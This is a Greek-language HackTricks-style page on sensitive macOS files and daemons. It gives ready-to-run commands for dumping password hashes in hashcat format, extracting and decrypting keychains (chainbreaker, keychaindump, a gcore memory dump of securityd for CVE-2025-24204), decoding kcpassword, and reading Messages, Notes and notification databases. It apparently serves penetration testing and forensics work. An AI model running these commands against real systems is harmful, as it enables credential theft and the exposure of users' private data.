# Ευαίσθητες τοποθεσίες και ενδιαφέροντα daemons του macOS

{{#include ../../../banners/hacktricks-training.md}}

## Κωδικοί πρόσβασης

### Shadow Passwords

Το Shadow password αποθηκεύεται μαζί με τις ρυθμίσεις του χρήστη σε plists που βρίσκονται στο **`/var/db/dslocal/nodes/Default/users/`**.\
Το παρακάτω oneliner μπορεί να χρησιμοποιηθεί για την αποτύπωση **όλων των πληροφοριών σχετικά με τους χρήστες** (συμπεριλαμβανομένων των πληροφοριών hash):
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Scripts like this one**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) ή [**this one**](https://github.com/octomagon/davegrohl.git) μπορούν να χρησιμοποιηθούν για τη μετατροπή του hash σε **hashcat** **format**.

Μια εναλλακτική one-liner που θα κάνει dump τα creds όλων των non-service accounts σε hashcat format `-m 7100` (macOS PBKDF2-SHA512):
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Ένας άλλος τρόπος για να αποκτήσετε το `ShadowHashData` ενός χρήστη είναι να χρησιμοποιήσετε το `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Αυτό το αρχείο **χρησιμοποιείται μόνο** όταν το system id εκτελείται σε **single-user mode** (οπότε όχι πολύ συχνά).

### Keychain Dump

Σημειώστε ότι όταν χρησιμοποιείτε το security binary για να κάνετε **dump τους αποκρυπτογραφημένους κωδικούς**, θα εμφανιστούν αρκετές προτροπές που θα ζητούν από τον χρήστη να επιτρέψει αυτήν τη λειτουργία.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
Στο σύγχρονο macOS, τα πιο ενδιαφέροντα backing stores είναι συνήθως τα **`~/Library/Keychains/login.keychain-db`** και **`/Library/Keychains/System.keychain`**. Πρόκειται για αρχεία που βασίζονται σε SQLite, όμως η πρόσβαση σε plaintext εξακολουθεί να γίνεται μέσω του **`securityd`**: η κλοπή της raw βάσης δεδομένων παρέχει κυρίως metadata και encrypted blobs, εκτός αν ανακτήσετε επίσης το password του χρήστη, το `SystemKey` ή ένα master key που βρίσκεται στη μνήμη.<sup>[[2]](#references)</sup>

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Με βάση αυτό το σχόλιο [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760), φαίνεται ότι αυτά τα tools δεν λειτουργούν πλέον στο Big Sur.

### Επισκόπηση του Keychaindump

Έχει αναπτυχθεί ένα tool με το όνομα **keychaindump** για την εξαγωγή passwords από macOS keychains, όμως αντιμετωπίζει περιορισμούς σε νεότερες εκδόσεις του macOS, όπως το Big Sur, όπως αναφέρεται σε μια [discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Η χρήση του **keychaindump** απαιτεί από τον attacker να αποκτήσει πρόσβαση και να κάνει privilege escalation σε **root**. Το tool εκμεταλλεύεται το γεγονός ότι το keychain ξεκλειδώνεται by default κατά το user login για λόγους ευκολίας, επιτρέποντας στις εφαρμογές να έχουν πρόσβαση σε αυτό χωρίς να απαιτείται επανειλημμένα το password του χρήστη. Ωστόσο, αν ένας χρήστης επιλέξει να κλειδώνει το keychain μετά από κάθε χρήση, το **keychaindump** καθίσταται ineffective.

Το **Keychaindump** λειτουργεί στοχεύοντας μια συγκεκριμένη process με το όνομα **securityd**, την οποία η Apple περιγράφει ως daemon για authorization και cryptographic operations, απαραίτητο για την πρόσβαση στο keychain. Η διαδικασία extraction περιλαμβάνει τον εντοπισμό ενός **Master Key** που παράγεται από το login password του χρήστη. Αυτό το key είναι απαραίτητο για την ανάγνωση του keychain file. Για τον εντοπισμό του **Master Key**, το **keychaindump** σαρώνει το memory heap του **securityd** χρησιμοποιώντας την εντολή `vmmap`, αναζητώντας πιθανά keys μέσα σε περιοχές με την ένδειξη `MALLOC_TINY`. Για την επιθεώρηση αυτών των memory locations χρησιμοποιείται η ακόλουθη εντολή:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Αφού εντοπίσει πιθανά master keys, το **keychaindump** αναζητά στις heaps ένα συγκεκριμένο pattern (`0x0000000000000018`) που υποδεικνύει υποψήφιο master key. Απαιτούνται περαιτέρω βήματα, συμπεριλαμβανομένου του deobfuscation, για τη χρήση αυτού του key, όπως περιγράφεται στον source code του **keychaindump**. Οι analysts που επικεντρώνονται σε αυτή την περιοχή θα πρέπει να σημειώσουν ότι τα κρίσιμα δεδομένα για την αποκρυπτογράφηση του keychain αποθηκεύονται στη μνήμη του process **securityd**. Ένα παράδειγμα command για την εκτέλεση του **keychaindump** είναι:
```bash
sudo ./keychaindump
```
### chainbreaker

Το [**Chainbreaker**](https://github.com/n0fate/chainbreaker) μπορεί να χρησιμοποιηθεί για την εξαγωγή των ακόλουθων τύπων πληροφοριών από ένα OSX keychain με τρόπο που διατηρεί την εγκληματολογική ακεραιότητα:

- Hashed κωδικός πρόσβασης Keychain, κατάλληλος για cracking με τα [hashcat](https://hashcat.net/hashcat/) ή [John the Ripper](https://www.openwall.com/john/)
- Κωδικοί πρόσβασης στο Internet
- Generic κωδικοί πρόσβασης
- Private Keys
- Public Keys
- Πιστοποιητικά X509
- Secure Notes
- Κωδικοί πρόσβασης Appleshare

Με δεδομένο τον κωδικό πρόσβασης ξεκλειδώματος του keychain, ένα master key που αποκτήθηκε με το [volafox](https://github.com/n0fate/volafox) ή το [volatility](https://github.com/volatilityfoundation/volatility), ή ένα αρχείο ξεκλειδώματος όπως το SystemKey, το Chainbreaker θα παρέχει επίσης κωδικούς πρόσβασης σε plaintext.

Χωρίς κάποια από αυτές τις μεθόδους ξεκλειδώματος του Keychain, το Chainbreaker θα εμφανίσει όλες τις υπόλοιπες διαθέσιμες πληροφορίες.

#### **Dump κλειδιών keychain**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Dump κλειδιά keychain (με passwords) με το SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (με passwords) κάνοντας cracking του hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Εξαγωγή κλειδιών του Keychain (με κωδικούς πρόσβασης) με memory dump**

[Ακολουθήστε αυτά τα βήματα](../index.html#dumping-memory-with-osxpmem) για να πραγματοποιήσετε ένα **memory dump**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) using the password of the user**

If you know the password of the user, you can use it to **dump and decrypt keychains that belong to the user**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Κύριο κλειδί του Keychain μέσω entitlement του `gcore` (CVE-2025-24204)

Το macOS 15.0 (Sequoia) κυκλοφόρησε το `/usr/bin/gcore` με το **`com.apple.system-task-ports.read`** entitlement, επομένως οποιοσδήποτε local admin (ή malicious signed app) μπορούσε να κάνει dump τη μνήμη οποιασδήποτε διεργασίας, ακόμη και με ενεργοποιημένα τα SIP/TCC. Το dumping του `securityd` διαρρέει το **κύριο κλειδί του Keychain** σε clear και σας επιτρέπει να κάνετε decrypt το `login.keychain-db` χωρίς τον κωδικό πρόσβασης του χρήστη.<sup>[[1]](#references)</sup>

**Γρήγορο repro σε ευάλωτα builds (15.0–15.2):**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Τροφοδοτήστε το extracted hex key στο Chainbreaker (`--key <hex>`) για να αποκρυπτογραφήσετε το login keychain. Η Apple αφαίρεσε το entitlement στο **macOS 15.3+**, επομένως αυτό λειτουργεί μόνο σε unpatched Sequoia builds ή σε συστήματα που διατήρησαν το vulnerable binary.

### kcpassword

Το αρχείο **kcpassword** περιέχει το **login password του χρήστη**, αλλά μόνο αν ο ιδιοκτήτης του συστήματος έχει **ενεργοποιήσει το automatic login**. Επομένως, ο χρήστης θα συνδέεται αυτόματα χωρίς να του ζητείται password (κάτι που δεν είναι ιδιαίτερα ασφαλές).

Το password αποθηκεύεται στο αρχείο **`/etc/kcpassword`** με XOR με το key **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Αν το password του χρήστη είναι μεγαλύτερο από το key, το key θα επαναχρησιμοποιείται.\
Αυτό καθιστά την ανάκτηση του password αρκετά εύκολη, για παράδειγμα με scripts όπως [**αυτό**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Ενδιαφέρουσες πληροφορίες σε Databases

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Notifications

Πριν από το **Sequoia**, μπορείτε συνήθως να βρείτε το store του Notification Center στο **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. Στο **Sequoia+**, η Apple το μετέφερε στο TCC-protected group container **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**.

Οι περισσότερες ενδιαφέρουσες πληροφορίες αποθηκεύονται μέσα σε στήλες **blob**, επομένως θα χρειαστεί να εξαγάγετε αυτό το περιεχόμενο και να το μετατρέψετε σε μορφή αναγνώσιμη από άνθρωπο (`plutil -p -`, `strings` ή έναν μικρό parser). Παραδείγματα για γρήγορο triage:
```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```
#### Πρόσφατα ζητήματα απορρήτου (NotificationCenter DB)

- Στο macOS **14.7–15.1** η Apple αποθήκευε το περιεχόμενο των banner στο `db2/db` SQLite χωρίς σωστή απόκρυψη. Τα CVEs **CVE-2024-44292/44293/40838/54504** επέτρεπαν σε οποιονδήποτε τοπικό χρήστη να διαβάσει το κείμενο των notifications άλλων χρηστών απλώς ανοίγοντας τη DB (χωρίς TCC prompt).
- Η Apple μετρίασε το πρόβλημα μετακινώντας τη DB στο `group.com.apple.usernoted` και προστατεύοντάς τη με TCC σε νεότερα Sequoia builds, επομένως στα τρέχοντα συστήματα συνήθως χρειάζεστε το σωστό user context ή ένα TCC bypass για να την διαβάσετε.<sup>[[3]](#references)</sup>
- Σε παλαιότερα endpoints, αντιγράψτε τα αρχεία `db`, `db-wal` και `db-shm` μαζί πριν από την ενημέρωση ή την επανεκκίνηση, αν θέλετε να διατηρήσετε τα artefacts.

### Σημειώσεις

Οι **σημειώσεις** των χρηστών βρίσκονται στο `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```
Αν το παραπάνω one-liner παράγει υπερβολικό θόρυβο, κάντε export το `ZICNOTEDATA.ZDATA`, αποσυμπιέστε το με gunzip και κάντε parse το protobuf: αυτό είναι συνήθως πιο αξιόπιστο από την απευθείας εκτέλεση του `strings` στο SQLite.

### Background Tasks / Login Items

Από το **Ventura**, τα login items που έχουν εγκριθεί από τον χρήστη και αρκετά background tasks καταγράφονται σε stores του **BTM**, όπως το **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** και το versioned system cache **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.

Αυτά τα αρχεία είναι χρήσιμα για τον γρήγορο εντοπισμό persistence, helper tools και ορισμένων background items που managed μέσω MDM:
```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```
Για την πλευρά του persistence και τα εσωτερικά του BTM, δείτε [τη σελίδα με τις τοποθεσίες auto-start](../../macos-auto-start-locations.md#login-items) και [τις σημειώσεις για το Background Tasks Management](../macos-security-protections/README.md#background-tasks-management).

## Προτιμήσεις

Στις εφαρμογές macOS οι προτιμήσεις βρίσκονται στο **`$HOME/Library/Preferences`** και στο iOS βρίσκονται στο `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

Στο macOS το cli tool **`defaults`** μπορεί να χρησιμοποιηθεί για **τροποποίηση του αρχείου Preferences**.

Το **`/usr/sbin/cfprefsd`** διεκδικεί τα XPC services `com.apple.cfprefsd.daemon` και `com.apple.cfprefsd.agent` και μπορεί να κληθεί για την εκτέλεση ενεργειών, όπως η τροποποίηση προτιμήσεων.

## OpenDirectory permissions.plist

Το αρχείο `/System/Library/OpenDirectory/permissions.plist` περιέχει permissions που εφαρμόζονται σε node attributes και προστατεύεται από το SIP.\
Αυτό το αρχείο παρέχει permissions σε συγκεκριμένους χρήστες μέσω UUID (και όχι uid), ώστε να μπορούν να έχουν πρόσβαση σε συγκεκριμένες ευαίσθητες πληροφορίες, όπως `ShadowHashData`, `HeimdalSRPKey` και `KerberosKeys`, μεταξύ άλλων:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## System Notifications

### Darwin Notifications

Ο κύριος daemon για τις ειδοποιήσεις είναι ο **`/usr/sbin/notifyd`**. Για να λαμβάνουν ειδοποιήσεις, οι clients πρέπει να εγγραφούν μέσω του Mach port `com.apple.system.notification_center` (ελέγξτε τα με `sudo lsmp -p <pid notifyd>`). Ο daemon μπορεί να ρυθμιστεί με το αρχείο `/etc/notify.conf`.

Τα ονόματα που χρησιμοποιούνται για τις ειδοποιήσεις είναι μοναδικές reverse DNS notations και, όταν αποστέλλεται μια ειδοποίηση σε ένα από αυτά, θα τη λάβουν οι client(s) που έχουν δηλώσει ότι μπορούν να τη διαχειριστούν.

Είναι δυνατή η αποτύπωση της τρέχουσας κατάστασης (και η εμφάνιση όλων των ονομάτων) με την αποστολή του signal SIGUSR2 στη διεργασία notifyd και την ανάγνωση του αρχείου που δημιουργείται: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

Το **Distributed Notification Center**, του οποίου το κύριο binary είναι το **`/usr/sbin/distnoted`**, είναι ένας ακόμη τρόπος αποστολής notifications. Εκθέτει ορισμένες XPC services και εκτελεί κάποιους ελέγχους για να προσπαθήσει να επαληθεύσει τους clients.

### Apple Push Notifications (APN)

Σε αυτή την περίπτωση, οι εφαρμογές μπορούν να εγγραφούν σε **topics**. Ο client δημιουργεί ένα token επικοινωνώντας με τους servers της Apple μέσω του **`apsd`**.\
Στη συνέχεια, οι providers θα έχουν επίσης δημιουργήσει ένα token και θα μπορούν να συνδεθούν με τους servers της Apple για να στείλουν μηνύματα στους clients. Αυτά τα μηνύματα θα ληφθούν τοπικά από το **`apsd`**, το οποίο θα προωθήσει το notification στην εφαρμογή που το περιμένει.

Οι preferences βρίσκονται στο `/Library/Preferences/com.apple.apsd.plist`.

Υπάρχει μια local database μηνυμάτων στο macOS στη `/Library/Application\ Support/ApplePushService/aps.db` και στο iOS στη `/var/mobile/Library/ApplePushService`. Περιέχει 3 tables: `incoming_messages`, `outgoing_messages` και `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Είναι επίσης δυνατό να λάβετε πληροφορίες σχετικά με το daemon και τις συνδέσεις χρησιμοποιώντας:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Ειδοποιήσεις χρήστη

Αυτές είναι ειδοποιήσεις που πρέπει να βλέπει ο χρήστης στην οθόνη:

- **`CFUserNotification`**: Αυτά τα API παρέχουν έναν τρόπο εμφάνισης ενός αναδυόμενου παραθύρου με μήνυμα στην οθόνη.
- **The Bulletin Board**: Αυτό εμφανίζει στο iOS ένα banner που εξαφανίζεται και αποθηκεύεται στο Notification Center.
- **`NSUserNotificationCenter`**: Αυτό είναι το bulletin board του iOS στο MacOS. Σε παλαιότερες εκδόσεις του macOS, η βάση δεδομένων συνήθως βρίσκεται στο `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`· στο Sequoia+ μεταφέρθηκε στο `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.

## Αναφορές

- [1] [HelpNetSecurity – Το entitlement του macOS gcore επέτρεπε την εξαγωγή του κύριου κλειδιού του Keychain (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [2] [Apple Platform Security – Προστασία δεδομένων του Keychain](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [3] [9to5Mac – Η Apple αντιμετωπίζει τις ανησυχίες περί απορρήτου σχετικά με τη βάση δεδομένων του Notification Center στο macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)

{{#include ../../../banners/hacktricks-training.md}}
